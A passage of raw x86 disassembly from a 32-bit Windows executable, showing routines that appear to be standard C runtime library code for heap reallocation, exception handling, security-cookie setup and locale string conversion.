  4271bd:	add    edx,ecx
  4271bf:	lea    ecx,[esi+0x1]
  4271c2:	mov    DWORD PTR [edx],ecx
  4271c4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4271c8:	mov    esi,DWORD PTR [ebp-0xc]
  4271cb:	mov    ecx,DWORD PTR [esi]
  4271cd:	test   ecx,ecx
  4271cf:	lea    edi,[ecx+0x1]
  4271d2:	mov    DWORD PTR [esi],edi
  4271d4:	jne    0x4271f0
  4271d6:	cmp    ebx,DWORD PTR ds:0x45def8
  4271dc:	jne    0x4271f0
  4271de:	mov    ecx,DWORD PTR [ebp-0x4]
  4271e1:	cmp    ecx,DWORD PTR ds:0x45df10
  4271e7:	jne    0x4271f0
  4271e9:	and    DWORD PTR ds:0x45def8,0x0
  4271f0:	mov    ecx,DWORD PTR [ebp-0x4]
  4271f3:	mov    DWORD PTR [eax],ecx
  4271f5:	lea    eax,[edx+0x4]
  4271f8:	pop    edi
  4271f9:	pop    esi
  4271fa:	pop    ebx
  4271fb:	leave  
  4271fc:	ret    
  4271fd:	int3   
  4271fe:	int3   
  4271ff:	int3   
  427200:	push   esi
  427201:	inc    ebx
  427202:	xor    dh,BYTE PTR [eax]
  427204:	pop    eax
  427205:	inc    ebx
  427206:	xor    BYTE PTR [eax],dh
  427208:	push   ebp
  427209:	mov    ebp,esp
  42720b:	sub    esp,0x8
  42720e:	push   ebx
  42720f:	push   esi
  427210:	push   edi
  427211:	push   ebp
  427212:	cld    
  427213:	mov    ebx,DWORD PTR [ebp+0xc]
  427216:	mov    eax,DWORD PTR [ebp+0x8]
  427219:	test   DWORD PTR [eax+0x4],0x6
  427220:	jne    0x4272a8
  427226:	mov    DWORD PTR [ebp-0x8],eax
  427229:	mov    eax,DWORD PTR [ebp+0x10]
  42722c:	mov    DWORD PTR [ebp-0x4],eax
  42722f:	lea    eax,[ebp-0x8]
  427232:	mov    DWORD PTR [ebx-0x4],eax
  427235:	mov    esi,DWORD PTR [ebx+0xc]
  427238:	mov    edi,DWORD PTR [ebx+0x8]
  42723b:	cmp    esi,0xffffffff
  42723e:	je     0x4272a1
  427240:	lea    ecx,[esi+esi*2]
  427243:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  427248:	je     0x42728f
  42724a:	push   esi
  42724b:	push   ebp
  42724c:	lea    ebp,[ebx+0x10]
  42724f:	call   DWORD PTR [edi+ecx*4+0x4]
  427253:	pop    ebp
  427254:	pop    esi
  427255:	mov    ebx,DWORD PTR [ebp+0xc]
  427258:	or     eax,eax
  42725a:	je     0x42728f
  42725c:	js     0x42729a
  42725e:	mov    edi,DWORD PTR [ebx+0x8]
  427261:	push   ebx
  427262:	call   0x428190
  427267:	add    esp,0x4
  42726a:	lea    ebp,[ebx+0x10]
  42726d:	push   esi
  42726e:	push   ebx
  42726f:	call   0x4281d2
  427274:	add    esp,0x8
  427277:	lea    ecx,[esi+esi*2]
  42727a:	push   0x1
  42727c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  427280:	call   0x428266
  427285:	mov    eax,DWORD PTR [edi+ecx*4]
  427288:	mov    DWORD PTR [ebx+0xc],eax
  42728b:	call   DWORD PTR [edi+ecx*4+0x8]
  42728f:	mov    edi,DWORD PTR [ebx+0x8]
  427292:	lea    ecx,[esi+esi*2]
  427295:	mov    esi,DWORD PTR [edi+ecx*4]
  427298:	jmp    0x42723b
  42729a:	mov    eax,0x0
  42729f:	jmp    0x4272bd
  4272a1:	mov    eax,0x1
  4272a6:	jmp    0x4272bd
  4272a8:	push   ebp
  4272a9:	lea    ebp,[ebx+0x10]
  4272ac:	push   0xffffffff
  4272ae:	push   ebx
  4272af:	call   0x4281d2
  4272b4:	add    esp,0x8
  4272b7:	pop    ebp
  4272b8:	mov    eax,0x1
  4272bd:	pop    ebp
  4272be:	pop    edi
  4272bf:	pop    esi
  4272c0:	pop    ebx
  4272c1:	mov    esp,ebp
  4272c3:	pop    ebp
  4272c4:	ret    
  4272c5:	push   ebp
  4272c6:	mov    ecx,DWORD PTR [esp+0x8]
  4272ca:	mov    ebp,DWORD PTR [ecx]
  4272cc:	mov    eax,DWORD PTR [ecx+0x1c]
  4272cf:	push   eax
  4272d0:	mov    eax,DWORD PTR [ecx+0x18]
  4272d3:	push   eax
  4272d4:	call   0x4281d2
  4272d9:	add    esp,0x8
  4272dc:	pop    ebp
  4272dd:	ret    0x4
  4272e0:	call   0x4251f3
  4272e5:	add    eax,0x8
  4272e8:	ret    
  4272e9:	push   0x14
  4272eb:	push   0x429878
  4272f0:	call   0x425340
  4272f5:	mov    edi,DWORD PTR [ebp+0x8]
  4272f8:	xor    ebx,ebx
  4272fa:	cmp    edi,ebx
  4272fc:	jne    0x42730c
  4272fe:	push   DWORD PTR [ebp+0xc]
  427301:	call   0x426062
  427306:	pop    ecx
  427307:	jmp    0x427490
  42730c:	mov    esi,DWORD PTR [ebp+0xc]
  42730f:	cmp    esi,ebx
  427311:	jne    0x42731f
  427313:	push   edi
  427314:	call   0x425f4a
  427319:	pop    ecx
  42731a:	jmp    0x42748e
  42731f:	cmp    DWORD PTR ds:0x45e144,0x3
  427326:	jne    0x42745a
  42732c:	mov    DWORD PTR [ebp-0x1c],ebx
  42732f:	cmp    esi,0xffffffe0
  427332:	ja     0x427429
  427338:	push   0x4
  42733a:	call   0x4254ff
  42733f:	pop    ecx
  427340:	mov    DWORD PTR [ebp-0x4],ebx
  427343:	push   edi
  427344:	call   0x426722
  427349:	pop    ecx
  42734a:	mov    DWORD PTR [ebp-0x20],eax
  42734d:	cmp    eax,ebx
  42734f:	je     0x4273f9
  427355:	cmp    esi,DWORD PTR ds:0x45df04
  42735b:	ja     0x4273a9
  42735d:	push   esi
  42735e:	push   edi
  42735f:	push   eax
  427360:	call   0x426c22
  427365:	add    esp,0xc
  427368:	test   eax,eax
  42736a:	je     0x427371
  42736c:	mov    DWORD PTR [ebp-0x1c],edi
  42736f:	jmp    0x4273a9
  427371:	push   esi
  427372:	call   0x426f01
  427377:	pop    ecx
  427378:	mov    DWORD PTR [ebp-0x1c],eax
  42737b:	cmp    eax,ebx
  42737d:	je     0x4273a9
  42737f:	mov    eax,DWORD PTR [edi-0x4]
  427382:	dec    eax
  427383:	mov    DWORD PTR [ebp-0x24],eax
  427386:	cmp    eax,esi
  427388:	jb     0x42738c
  42738a:	mov    eax,esi
  42738c:	push   eax
  42738d:	push   edi
  42738e:	push   DWORD PTR [ebp-0x1c]
  427391:	call   0x426080
  427396:	push   edi
  427397:	call   0x426722
  42739c:	mov    DWORD PTR [ebp-0x20],eax
  42739f:	push   edi
  4273a0:	push   eax
  4273a1:	call   0x42674d
  4273a6:	add    esp,0x18
  4273a9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4273ac:	jne    0x4273f9
  4273ae:	cmp    esi,ebx
  4273b0:	jne    0x4273b8
  4273b2:	xor    esi,esi
  4273b4:	inc    esi
  4273b5:	mov    DWORD PTR [ebp+0xc],esi
  4273b8:	add    esi,0xf
  4273bb:	and    esi,0xfffffff0
  4273be:	mov    DWORD PTR [ebp+0xc],esi
  4273c1:	push   esi
  4273c2:	push   ebx
  4273c3:	push   DWORD PTR ds:0x45e140
  4273c9:	call   DWORD PTR ds:0x429030
  4273cf:	mov    DWORD PTR [ebp-0x1c],eax
  4273d2:	cmp    eax,ebx
  4273d4:	je     0x4273f9
  4273d6:	mov    eax,DWORD PTR [edi-0x4]
  4273d9:	dec    eax
  4273da:	mov    DWORD PTR [ebp-0x24],eax
  4273dd:	cmp    eax,esi
  4273df:	jb     0x4273e3
  4273e1:	mov    eax,esi
  4273e3:	push   eax
  4273e4:	push   edi
  4273e5:	push   DWORD PTR [ebp-0x1c]
  4273e8:	call   0x426080
  4273ed:	push   edi
  4273ee:	push   DWORD PTR [ebp-0x20]
  4273f1:	call   0x42674d
  4273f6:	add    esp,0x14
  4273f9:	or     DWORD PTR [ebp-0x4],0xffffffff
  4273fd:	call   0x427451
  427402:	cmp    DWORD PTR [ebp-0x20],ebx
  427405:	jne    0x427429
  427407:	cmp    esi,ebx
  427409:	jne    0x42740e
  42740b:	xor    esi,esi
  42740d:	inc    esi
  42740e:	add    esi,0xf
  427411:	and    esi,0xfffffff0
  427414:	mov    DWORD PTR [ebp+0xc],esi
  427417:	push   esi
  427418:	push   edi
  427419:	push   ebx
  42741a:	push   DWORD PTR ds:0x45e140
  427420:	call   DWORD PTR ds:0x4290d0
  427426:	mov    DWORD PTR [ebp-0x1c],eax
  427429:	mov    eax,DWORD PTR [ebp-0x1c]
  42742c:	cmp    eax,ebx
  42742e:	jne    0x427490
  427430:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427436:	je     0x427490
  427438:	push   esi
  427439:	call   0x427c22
  42743e:	pop    ecx
  42743f:	test   eax,eax
  427441:	jne    0x42732c
  427447:	jmp    0x42748e
  427449:	xor    ebx,ebx
  42744b:	mov    esi,DWORD PTR [ebp+0xc]
  42744e:	mov    edi,DWORD PTR [ebp+0x8]
  427451:	push   0x4
  427453:	call   0x42546b
  427458:	pop    ecx
  427459:	ret    
  42745a:	xor    eax,eax
  42745c:	cmp    esi,0xffffffe0
  42745f:	ja     0x427477
  427461:	cmp    esi,ebx
  427463:	jne    0x427468
  427465:	xor    esi,esi
  427467:	inc    esi
  427468:	push   esi
  427469:	push   edi
  42746a:	push   ebx
  42746b:	push   DWORD PTR ds:0x45e140
  427471:	call   DWORD PTR ds:0x4290d0
  427477:	cmp    eax,ebx
  427479:	jne    0x427490
  42747b:	cmp    DWORD PTR ds:0x45ddc8,ebx
  427481:	je     0x427490
  427483:	push   esi
  427484:	call   0x427c22
  427489:	pop    ecx
  42748a:	test   eax,eax
  42748c:	jne    0x42745a
  42748e:	xor    eax,eax
  427490:	call   0x42537b
  427495:	ret    
  427496:	push   0x10
  427498:	push   0x429888
  42749d:	call   0x425340
  4274a2:	cmp    DWORD PTR ds:0x45e144,0x3
  4274a9:	jne    0x4274e5
  4274ab:	push   0x4
  4274ad:	call   0x4254ff
  4274b2:	pop    ecx
  4274b3:	and    DWORD PTR [ebp-0x4],0x0
  4274b7:	mov    esi,DWORD PTR [ebp+0x8]
  4274ba:	push   esi
  4274bb:	call   0x426722
  4274c0:	pop    ecx
  4274c1:	mov    DWORD PTR [ebp-0x1c],eax
  4274c4:	test   eax,eax
  4274c6:	je     0x4274d3
  4274c8:	mov    esi,DWORD PTR [esi-0x4]
  4274cb:	sub    esi,0x9
  4274ce:	mov    DWORD PTR [ebp-0x20],esi
  4274d1:	jmp    0x4274d6
  4274d3:	mov    esi,DWORD PTR [ebp-0x20]
  4274d6:	or     DWORD PTR [ebp-0x4],0xffffffff
  4274da:	call   0x427503
  4274df:	cmp    DWORD PTR [ebp-0x1c],0x0
  4274e3:	jne    0x4274f8
  4274e5:	push   DWORD PTR [ebp+0x8]
  4274e8:	push   0x0
  4274ea:	push   DWORD PTR ds:0x45e140
  4274f0:	call   DWORD PTR ds:0x4290d4
  4274f6:	mov    esi,eax
  4274f8:	mov    eax,esi
  4274fa:	call   0x42537b
  4274ff:	ret    
  427500:	mov    esi,DWORD PTR [ebp-0x20]
  427503:	push   0x4
  427505:	call   0x42546b
  42750a:	pop    ecx
  42750b:	ret    
  42750c:	push   ebp
  42750d:	mov    ebp,esp
  42750f:	sub    esp,0x10
  427512:	push   esi
  427513:	lea    eax,[ebp-0x8]
  427516:	push   eax
  427517:	call   DWORD PTR ds:0x4290e4
  42751d:	mov    esi,DWORD PTR [ebp-0x4]
  427520:	xor    esi,DWORD PTR [ebp-0x8]
  427523:	call   DWORD PTR ds:0x4290e0
  427529:	xor    esi,eax
  42752b:	call   DWORD PTR ds:0x429098
  427531:	xor    esi,eax
  427533:	call   DWORD PTR ds:0x4290dc
  427539:	xor    esi,eax
  42753b:	lea    eax,[ebp-0x10]
  42753e:	push   eax
  42753f:	call   DWORD PTR ds:0x4290d8
  427545:	mov    eax,DWORD PTR [ebp-0xc]
  427548:	xor    eax,DWORD PTR [ebp-0x10]
  42754b:	xor    esi,eax
  42754d:	mov    DWORD PTR ds:0x45d430,esi
  427553:	jne    0x42755f
  427555:	mov    DWORD PTR ds:0x45d430,0xbb40e64e
  42755f:	pop    esi
  427560:	leave  
  427561:	ret    
  427562:	push   0x118
  427567:	push   0x429a38
  42756c:	call   0x425340
  427571:	mov    eax,ds:0x45d430
  427576:	xor    eax,DWORD PTR [ebp+0x4]
  427579:	mov    DWORD PTR [ebp-0x1c],eax
  42757c:	mov    eax,ds:0x45dd98
  427581:	xor    ecx,ecx
  427583:	cmp    eax,ecx
  427585:	je     0x4275a6
  427587:	mov    DWORD PTR [ebp-0x4],ecx
  42758a:	push   DWORD PTR [ebp+0xc]
  42758d:	push   DWORD PTR [ebp+0x8]
  427590:	call   eax
  427592:	pop    ecx
  427593:	pop    ecx
  427594:	or     DWORD PTR [ebp-0x4],0xffffffff
  427598:	jmp    0x4276a4
  42759d:	xor    eax,eax
  42759f:	inc    eax
  4275a0:	ret    
  4275a1:	mov    esp,DWORD PTR [ebp-0x18]
  4275a4:	jmp    0x427594
  4275a6:	mov    eax,DWORD PTR [ebp+0x8]
  4275a9:	dec    eax
  4275aa:	je     0x4275bf
  4275ac:	mov    edi,0x429a14
  4275b1:	mov    DWORD PTR [ebp-0x20],0x429960
  4275b8:	mov    esi,0xd4
  4275bd:	jmp    0x4275d0
  4275bf:	mov    edi,0x429940
  4275c4:	mov    DWORD PTR [ebp-0x20],0x4298a0
  4275cb:	mov    esi,0xb9
  4275d0:	mov    BYTE PTR [ebp-0x24],cl
  4275d3:	push   0x104
  4275d8:	lea    eax,[ebp-0x128]
  4275de:	push   eax
  4275df:	push   ecx
  4275e0:	call   DWORD PTR ds:0x429068
  4275e6:	test   eax,eax
  4275e8:	jne    0x4275fd
  4275ea:	push   0x429594
  4275ef:	lea    eax,[ebp-0x128]
  4275f5:	push   eax
  4275f6:	call   0x425720
  4275fb:	pop    ecx
  4275fc:	pop    ecx
  4275fd:	lea    ebx,[ebp-0x128]
  427603:	lea    eax,[ebp-0x128]
  427609:	push   eax
  42760a:	call   0x425950
  42760f:	pop    ecx
  427610:	add    eax,0xb
  427613:	cmp    eax,0x3c
  427616:	jbe    0x427641
  427618:	lea    eax,[ebp-0x128]
  42761e:	push   eax
  42761f:	call   0x425950
  427624:	mov    ebx,eax
  427626:	lea    eax,[ebp-0x128]
  42762c:	sub    eax,0x31
  42762f:	add    ebx,eax
  427631:	push   0x3
  427633:	push   0x429590
  427638:	push   ebx
  427639:	call   0x425820
  42763e:	add    esp,0x10
  427641:	push   ebx
  427642:	call   0x425950
  427647:	pop    ecx
  427648:	lea    eax,[eax+esi*1+0xc]
  42764c:	add    eax,0x3
  42764f:	and    eax,0xfffffffc
  427652:	call   0x425390
  427657:	mov    DWORD PTR [ebp-0x18],esp
  42765a:	mov    esi,esp
  42765c:	push   edi
  42765d:	push   esi
  42765e:	call   0x425720
  427663:	mov    edi,0x429570
  427668:	push   edi
  427669:	push   esi
  42766a:	call   0x425730
  42766f:	push   0x429894
  427674:	push   esi
  427675:	call   0x425730
  42767a:	push   ebx
  42767b:	push   esi
  42767c:	call   0x425730
  427681:	push   edi
  427682:	push   esi
  427683:	call   0x425730
  427688:	push   DWORD PTR [ebp-0x20]
  42768b:	push   esi
  42768c:	call   0x425730
  427691:	push   0x12010
  427696:	push   0x429548
  42769b:	push   esi
  42769c:	call   0x425622
  4276a1:	add    esp,0x3c
  4276a4:	push   0x3
  4276a6:	call   0x4247ac
  4276ab:	int3   
  4276ac:	push   0x38
  4276ae:	push   0x429e58
  4276b3:	call   0x425340
  4276b8:	xor    ebx,ebx
  4276ba:	cmp    DWORD PTR ds:0x45ddbc,ebx
  4276c0:	jne    0x4276fa
  4276c2:	push   ebx
  4276c3:	push   ebx
  4276c4:	xor    esi,esi
  4276c6:	inc    esi
  4276c7:	push   esi
  4276c8:	push   0x429e54
  4276cd:	push   0x100
  4276d2:	push   ebx
  4276d3:	call   DWORD PTR ds:0x4290f0
  4276d9:	test   eax,eax
  4276db:	je     0x4276e5
  4276dd:	mov    DWORD PTR ds:0x45ddbc,esi
  4276e3:	jmp    0x4276fa
  4276e5:	call   DWORD PTR ds:0x429044
  4276eb:	cmp    eax,0x78
  4276ee:	jne    0x4276fa
  4276f0:	mov    DWORD PTR ds:0x45ddbc,0x2
  4276fa:	cmp    DWORD PTR [ebp+0x14],ebx
  4276fd:	jle    0x42771a
  4276ff:	mov    ecx,DWORD PTR [ebp+0x14]
  427702:	mov    eax,DWORD PTR [ebp+0x10]
  427705:	dec    ecx
  427706:	cmp    BYTE PTR [eax],bl
  427708:	je     0x427712
  42770a:	inc    eax
  42770b:	cmp    ecx,ebx
  42770d:	jne    0x427705
  42770f:	or     ecx,0xffffffff
  427712:	or     eax,0xffffffff
  427715:	sub    eax,ecx
  427717:	add    DWORD PTR [ebp+0x14],eax
  42771a:	mov    eax,ds:0x45ddbc
  42771f:	cmp    eax,0x2
  427722:	je     0x427904
  427728:	cmp    eax,ebx
  42772a:	je     0x427904
  427730:	cmp    eax,0x1
  427733:	jne    0x427937
  427739:	xor    edi,edi
  42773b:	mov    DWORD PTR [ebp-0x1c],edi
  42773e:	mov    DWORD PTR [ebp-0x20],ebx
  427741:	mov    DWORD PTR [ebp-0x24],ebx
  427744:	cmp    DWORD PTR [ebp+0x20],ebx
  427747:	jne    0x427751
  427749:	mov    eax,ds:0x45ddb4
  42774e:	mov    DWORD PTR [ebp+0x20],eax
  427751:	push   ebx
  427752:	push   ebx
  427753:	push   DWORD PTR [ebp+0x14]
  427756:	push   DWORD PTR [ebp+0x10]
  427759:	xor    eax,eax
  42775b:	cmp    DWORD PTR [ebp+0x24],ebx
  42775e:	setne  al
  427761:	lea    eax,[eax*8+0x1]
  427768:	push   eax
  427769:	push   DWORD PTR [ebp+0x20]
  42776c:	call   DWORD PTR ds:0x4290ec
  427772:	mov    esi,eax
  427774:	mov    DWORD PTR [ebp-0x28],esi
  427777:	cmp    esi,ebx
  427779:	je     0x427937
  42777f:	mov    DWORD PTR [ebp-0x4],0x1
  427786:	lea    eax,[esi+esi*1]
  427789:	add    eax,0x3
  42778c:	and    eax,0xfffffffc
  42778f:	call   0x425390
  427794:	mov    DWORD PTR [ebp-0x18],esp
  427797:	mov    eax,esp
  427799:	mov    DWORD PTR [ebp-0x2c],eax
  42779c:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277a0:	jmp    0x4277bd
  4277a2:	xor    eax,eax
  4277a4:	inc    eax
  4277a5:	ret    
  4277a6:	mov    esp,DWORD PTR [ebp-0x18]
  4277a9:	call   0x4287d5
  4277ae:	xor    ebx,ebx
  4277b0:	mov    DWORD PTR [ebp-0x2c],ebx
  4277b3:	or     DWORD PTR [ebp-0x4],0xffffffff
  4277b7:	mov    edi,DWORD PTR [ebp-0x1c]
  4277ba:	mov    esi,DWORD PTR [ebp-0x28]
  4277bd:	cmp    DWORD PTR [ebp-0x2c],ebx
  4277c0:	jne    0x4277de
  4277c2:	lea    eax,[esi+esi*1]
  4277c5:	push   eax
  4277c6:	call   0x426062
  4277cb:	pop    ecx
  4277cc:	mov    DWORD PTR [ebp-0x2c],eax
  4277cf:	cmp    eax,ebx
  4277d1:	je     0x427937
  4277d7:	mov    DWORD PTR [ebp-0x20],0x1
  4277de:	push   esi
  4277df:	push   DWORD PTR [ebp-0x2c]
  4277e2:	push   DWORD PTR [ebp+0x14]
  4277e5:	push   DWORD PTR [ebp+0x10]
  4277e8:	push   0x1
  4277ea:	push   DWORD PTR [ebp+0x20]
  4277ed:	call   DWORD PTR ds:0x4290ec
  4277f3:	test   eax,eax
  4277f5:	je     0x4278e1
  4277fb:	push   ebx
  4277fc:	push   ebx
  4277fd:	push   esi
  4277fe:	push   DWORD PTR [ebp-0x2c]
  427801:	push   DWORD PTR [ebp+0xc]
  427804:	push   DWORD PTR [ebp+0x8]
  427807:	call   DWORD PTR ds:0x4290f0
  42780d:	mov    edi,eax
  42780f:	mov    DWORD PTR [ebp-0x1c],edi
  427812:	cmp    edi,ebx
  427814:	je     0x4278e1
  42781a:	test   BYTE PTR [ebp+0xd],0x4
  42781e:	je     0x42784d
  427820:	cmp    DWORD PTR [ebp+0x1c],ebx
  427823:	je     0x4278e1
  427829:	cmp    edi,DWORD PTR [ebp+0x1c]
  42782c:	jg     0x4278e1
  427832:	push   DWORD PTR [ebp+0x1c]
  427835:	push   DWORD PTR [ebp+0x18]
  427838:	push   esi
  427839:	push   DWORD PTR [ebp-0x2c]
  42783c:	push   DWORD PTR [ebp+0xc]
  42783f:	push   DWORD PTR [ebp+0x8]
  427842:	call   DWORD PTR ds:0x4290f0
  427848:	jmp    0x4278e1
  42784d:	mov    DWORD PTR [ebp-0x4],0x2
  427854:	lea    eax,[edi+edi*1]
  427857:	add    eax,0x3
  42785a:	and    eax,0xfffffffc
  42785d:	call   0x425390
  427862:	mov    DWORD PTR [ebp-0x18],esp
  427865:	mov    eax,esp
  427867:	mov    DWORD PTR [ebp-0x30],eax
  42786a:	or     DWORD PTR [ebp-0x4],0xffffffff
  42786e:	jmp    0x42788b
  427870:	xor    eax,eax
  427872:	inc    eax
  427873:	ret    
  427874:	mov    esp,DWORD PTR [ebp-0x18]
  427877:	call   0x4287d5
  42787c:	xor    ebx,ebx
  42787e:	mov    DWORD PTR [ebp-0x30],ebx
  427881:	or     DWORD PTR [ebp-0x4],0xffffffff
  427885:	mov    edi,DWORD PTR [ebp-0x1c]
  427888:	mov    esi,DWORD PTR [ebp-0x28]
  42788b:	cmp    DWORD PTR [ebp-0x30],ebx
  42788e:	jne    0x4278a8
  427890:	lea    eax,[edi+edi*1]
  427893:	push   eax
  427894:	call   0x426062
  427899:	pop    ecx
  42789a:	mov    DWORD PTR [ebp-0x30],eax
  42789d:	cmp    eax,ebx
  42789f:	je     0x4278e1
  4278a1:	mov    DWORD PTR [ebp-0x24],0x1
  4278a8:	push   edi
  4278a9:	push   DWORD PTR [ebp-0x30]
  4278ac:	push   esi
  4278ad:	push   DWORD PTR [ebp-0x2c]
  4278b0:	push   DWORD PTR [ebp+0xc]
  4278b3:	push   DWORD PTR [ebp+0x8]
  4278b6:	call   DWORD PTR ds:0x4290f0
  4278bc:	test   eax,eax
  4278be:	je     0x4278e1
  4278c0:	push   ebx
  4278c1:	push   ebx
  4278c2:	cmp    DWORD PTR [ebp+0x1c],ebx
  4278c5:	jne    0x4278cb
  4278c7:	push   ebx
  4278c8:	push   ebx
  4278c9:	jmp    0x4278d1
  4278cb:	push   DWORD PTR [ebp+0x1c]
  4278ce:	push   DWORD PTR [ebp+0x18]
  4278d1:	push   edi
  4278d2:	push   DWORD PTR [ebp-0x30]
  4278d5:	push   ebx
  4278d6:	push   DWORD PTR [ebp+0x20]
  4278d9:	call   DWORD PTR ds:0x42907c
  4278df:	mov    edi,eax
  4278e1:	cmp    DWORD PTR [ebp-0x24],ebx
  4278e4:	je     0x4278ef
  4278e6:	push   DWORD PTR [ebp-0x30]
  4278e9:	call   0x425f4a
  4278ee:	pop    ecx
  4278ef:	cmp    DWORD PTR [ebp-0x20],ebx
  4278f2:	je     0x4278fd
  4278f4:	push   DWORD PTR [ebp-0x2c]
  4278f7:	call   0x425f4a
  4278fc:	pop    ecx
  4278fd:	mov    eax,edi
  4278ff:	jmp    0x427a5f
  427904:	mov    DWORD PTR [ebp-0x34],ebx
  427907:	xor    edi,edi
  427909:	mov    DWORD PTR [ebp-0x38],ebx
  42790c:	cmp    DWORD PTR [ebp+0x8],ebx
  42790f:	jne    0x427919
  427911:	mov    eax,ds:0x45dda4
  427916:	mov    DWORD PTR [ebp+0x8],eax
  427919:	cmp    DWORD PTR [ebp+0x20],ebx
  42791c:	jne    0x427926
  42791e:	mov    eax,ds:0x45ddb4
  427923:	mov    DWORD PTR [ebp+0x20],eax
  427926:	push   DWORD PTR [ebp+0x8]
  427929:	call   0x4285bd
  42792e:	pop    ecx
  42792f:	mov    DWORD PTR [ebp-0x3c],eax
  427932:	cmp    eax,0xffffffff
  427935:	jne    0x42793e
  427937:	xor    eax,eax
  427939:	jmp    0x427a5f
  42793e:	cmp    eax,DWORD PTR [ebp+0x20]
  427941:	je     0x427a35
  427947:	push   ebx
  427948:	push   ebx
  427949:	lea    ecx,[ebp+0x14]
  42794c:	push   ecx
  42794d:	push   DWORD PTR [ebp+0x10]
  427950:	push   eax
  427951:	push   DWORD PTR [ebp+0x20]
  427954:	call   0x428606
  427959:	add    esp,0x18
  42795c:	mov    DWORD PTR [ebp-0x34],eax
  42795f:	cmp    eax,ebx
  427961:	je     0x427937
  427963:	push   ebx
  427964:	push   ebx
  427965:	push   DWORD PTR [ebp+0x14]
  427968:	push   eax
  427969:	push   DWORD PTR [ebp+0xc]
  42796c:	push   DWORD PTR [ebp+0x8]
  42796f:	call   DWORD PTR ds:0x4290e8
  427975:	mov    esi,eax
  427977:	mov    DWORD PTR [ebp-0x40],esi
  42797a:	cmp    esi,ebx
  42797c:	je     0x427a24
  427982:	mov    DWORD PTR [ebp-0x4],ebx
  427985:	add    eax,0x3
  427988:	and    eax,0xfffffffc
  42798b:	call   0x425390
  427990:	mov    DWORD PTR [ebp-0x18],esp
  427993:	mov    edi,esp
  427995:	mov    DWORD PTR [ebp-0x44],edi
  427998:	push   esi
  427999:	push   ebx
  42799a:	push   edi
  42799b:	call   0x427c40
  4279a0:	add    esp,0xc
  4279a3:	jmp    0x4279b5
  4279a5:	xor    eax,eax
  4279a7:	inc    eax
  4279a8:	ret    
  4279a9:	mov    esp,DWORD PTR [ebp-0x18]
  4279ac:	call   0x4287d5
  4279b1:	xor    ebx,ebx
  4279b3:	xor    edi,edi
  4279b5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4279b9:	cmp    edi,ebx
  4279bb:	jne    0x4279e0
  4279bd:	push   DWORD PTR [ebp-0x40]
  4279c0:	call   0x426062
  4279c5:	pop    ecx
  4279c6:	mov    edi,eax
  4279c8:	cmp    edi,ebx
  4279ca:	je     0x4279fd
  4279cc:	push   DWORD PTR [ebp-0x40]
  4279cf:	push   ebx
  4279d0:	push   edi
  4279d1:	call   0x427c40
  4279d6:	add    esp,0xc
  4279d9:	mov    DWORD PTR [ebp-0x38],0x1
  4279e0:	push   DWORD PTR [ebp-0x40]
  4279e3:	push   edi
  4279e4:	push   DWORD PTR [ebp+0x14]
  4279e7:	push   DWORD PTR [ebp-0x34]
  4279ea:	push   DWORD PTR [ebp+0xc]
  4279ed:	push   DWORD PTR [ebp+0x8]
  4279f0:	call   DWORD PTR ds:0x4290e8
  4279f6:	mov    DWORD PTR [ebp-0x40],eax
  4279f9:	cmp    eax,ebx
  4279fb:	jne    0x427a01
  4279fd:	xor    esi,esi
  4279ff:	jmp    0x427a27
  427a01:	push   DWORD PTR [ebp+0x1c]
  427a04:	push   DWORD PTR [ebp+0x18]
  427a07:	lea    eax,[ebp-0x40]
  427a0a:	push   eax
  427a0b:	push   edi
  427a0c:	push   DWORD PTR [ebp+0x20]
  427a0f:	push   DWORD PTR [ebp-0x3c]
  427a12:	call   0x428606
  427a17:	add    esp,0x18
  427a1a:	mov    esi,eax
  427a1c:	neg    esi
  427a1e:	sbb    esi,esi
  427a20:	neg    esi
  427a22:	jmp    0x427a27
  427a24:	mov    esi,DWORD PTR [ebp-0x48]
  427a27:	cmp    DWORD PTR [ebp-0x38],ebx
  427a2a:	je     0x427a4f
  427a2c:	push   edi
  427a2d:	call   0x425f4a
  427a32:	pop    ecx
  427a33:	jmp    0x427a4f
  427a35:	push   DWORD PTR [ebp+0x1c]
  427a38:	push   DWORD PTR [ebp+0x18]
  427a3b:	push   DWORD PTR [ebp+0x14]
  427a3e:	push   DWORD PTR [ebp+0x10]
  427a41:	push   DWORD PTR [ebp+0xc]
  427a44:	push   DWORD PTR [ebp+0x8]
  427a47:	call   DWORD PTR ds:0x4290e8
  427a4d:	mov    esi,eax
  427a4f:	cmp    DWORD PTR [ebp-0x34],ebx
  427a52:	je     0x427a5d
  427a54:	push   DWORD PTR [ebp-0x34]
  427a57:	call   0x425f4a
  427a5c:	pop    ecx
  427a5d:	mov    eax,esi
  427a5f:	lea    esp,[ebp-0x54]
  427a62:	call   0x42537b
  427a67:	ret    
  427a68:	push   0x1c
  427a6a:	push   0x429e80
  427a6f:	call   0x425340
  427a74:	xor    esi,esi
  427a76:	cmp    DWORD PTR ds:0x45ddc0,esi
  427a7c:	jne    0x427ab3
  427a7e:	lea    eax,[ebp-0x1c]
  427a81:	push   eax
  427a82:	xor    edi,edi
  427a84:	inc    edi
  427a85:	push   edi
  427a86:	push   0x429e54
  427a8b:	push   edi
  427a8c:	call   DWORD PTR ds:0x4290f8
  427a92:	test   eax,eax
  427a94:	je     0x427a9e
  427a96:	mov    DWORD PTR ds:0x45ddc0,edi
  427a9c:	jmp    0x427ab3
  427a9e:	call   DWORD PTR ds:0x429044
  427aa4:	cmp    eax,0x78
  427aa7:	jne    0x427ab3
  427aa9:	mov    DWORD PTR ds:0x45ddc0,0x2
  427ab3:	mov    eax,ds:0x45ddc0
  427ab8:	cmp    eax,0x2
  427abb:	je     0x427bab
  427ac1:	cmp    eax,esi
  427ac3:	je     0x427bab
  427ac9:	cmp    eax,0x1
  427acc:	jne    0x427bd1
  427ad2:	mov    DWORD PTR [ebp-0x20],esi
  427ad5:	mov    DWORD PTR [ebp-0x24],esi
  427ad8:	cmp    DWORD PTR [ebp+0x18],esi
  427adb:	jne    0x427ae5
  427add:	mov    eax,ds:0x45ddb4
  427ae2:	mov    DWORD PTR [ebp+0x18],eax
  427ae5:	push   esi
  427ae6:	push   esi
  427ae7:	push   DWORD PTR [ebp+0x10]
  427aea:	push   DWORD PTR [ebp+0xc]
